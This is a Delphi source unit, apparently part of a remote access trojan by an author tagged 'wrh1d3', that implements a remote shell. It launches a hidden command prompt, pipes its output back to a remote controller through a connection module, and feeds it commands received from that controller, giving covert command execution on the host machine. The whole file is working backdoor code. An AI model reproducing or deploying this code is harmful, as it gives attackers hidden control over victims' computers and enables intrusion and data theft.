unit UnitShell; //by wrh1d3

interface

uses
  Windows, SysUtils, UnitCommands;
  
var
  ShellCmd: string;

procedure ShellThread;

implementation

uses
  UnitConnection;

procedure ShellThread;
var
  Buffer, ToSend: string;
  SecurityAttributes: SECURITY_ATTRIBUTES;
  hiRead, hiWrite, hoRead, hoWrite: THandle;
  StartupInfo: TStartupInfo;
  ProcessInfo: TProcessInformation;
  BytesRead, BytesWritten, ExitCode, PipeMode: DWORD;
  ComSpec: array[0..MAX_PATH] of Char;
begin                                 
  SetLength(Buffer, 32767);
  SecurityAttributes.nLength := SizeOf(SECURITY_ATTRIBUTES);
  SecurityAttributes.lpSecurityDescriptor := nil;
  SecurityAttributes.bInheritHandle := True;
  CreatePipe(hiRead, hiWrite, @SecurityAttributes, 0);
  CreatePipe(hoRead, hoWrite, @SecurityAttributes, 0);
  GetStartupInfo(StartupInfo);
  StartupInfo.hStdOutput := hoWrite;
  StartupInfo.hStdError := hoWrite;
  StartupInfo.hStdInput := hiRead;
  StartupInfo.dwFlags := STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
  StartupInfo.wShowWindow := SW_HIDE;
  GetEnvironmentVariable('COMSPEC', ComSpec, sizeof(ComSpec));
  CreateProcess(nil, ComSpec, nil, nil, True, CREATE_NEW_CONSOLE, nil, nil, StartupInfo, ProcessInfo);
  CloseHandle(hoWrite);
  CloseHandle(hiRead);
  PipeMode := PIPE_NOWAIT;
  SetNamedPipeHandleState(hoRead, PipeMode , nil, nil);

  SendDatas(IntToStr(CMD_SHELL) + '|' + IntToStr(CMD_SHELL_START) + '|');

  repeat
    Sleep(10);
    GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
    if ExitCode <> STILL_ACTIVE then Break;
    ReadFile(hoRead, Pointer(Buffer)^, 32767, BytesRead, nil);
    if BytesRead > 0 then
    begin
      ToSend := Copy(Buffer, 1, BytesRead);
      OemToAnsi(PChar(ToSend), PChar(ToSend));
      SendDatas(IntToStr(CMD_SHELL) + '|' + IntToStr(CMD_SHELL_TEXT) + '|' + ToSend);
    end;

    if ShellCmd <> '' then
    begin
      WriteFile(hiWrite, Pointer(ShellCmd)^, Length(ShellCmd), BytesWritten, nil);
      WriteFile(hiWrite, #13#10, 2, BytesWritten, nil);
      ShellCmd := '';
    end;
  until False;

  GetExitCodeProcess(ProcessInfo.hProcess, ExitCode);
  if ExitCode = STILL_ACTIVE then TerminateProcess(ProcessInfo.hProcess, 0);
  CloseHandle(hoRead);
  CloseHandle(hiWrite);

  SendDatas(IntToStr(CMD_SHELL) + '|' + IntToStr(CMD_SHELL_STOP) + '|');
end;

end.
